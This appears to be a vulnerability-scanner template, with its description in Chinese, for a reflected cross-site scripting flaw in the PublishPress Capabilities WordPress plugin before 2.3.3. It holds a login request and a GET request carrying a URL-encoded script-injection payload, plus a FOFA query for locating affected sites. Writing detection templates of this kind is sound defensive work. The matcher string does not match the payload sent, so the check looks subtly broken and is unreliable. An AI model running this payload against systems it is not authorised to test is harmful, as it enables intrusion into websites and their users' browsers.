id: wp-publishpress-capabilities-xss

info:
  name: PublishPress Capabilities < 2.3.3 - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: PublishPress Capabilities < 2.3.3 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 2.3.3 or later.。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/88a57716-6e8b-4e98-884d-5534074c601a/
  classification:
    cwe-id: CWE-79
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
  metadata:
    max-request: 2
    verified: true
    fofa-query: body="/wp-content/plugins/capability-manager-enhanced"
  tags: xss,wordpress,wp-plugin,wp,capability-manager-enhanced,authenticated,vuln

http:
  - raw:
      - |
        POST /wp-login.php?redirect_to=http%3A%2F%2F{{Hostname}}%2Fwp-admin%2Foptions-general.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        GET /wp-admin/admin.php?page=pp-capabilities-roles&a%22%3E%3Cscript%3Ealert("document.domain")%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "<script>alert(document_domain)</script>"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: status
        status:
          - 200
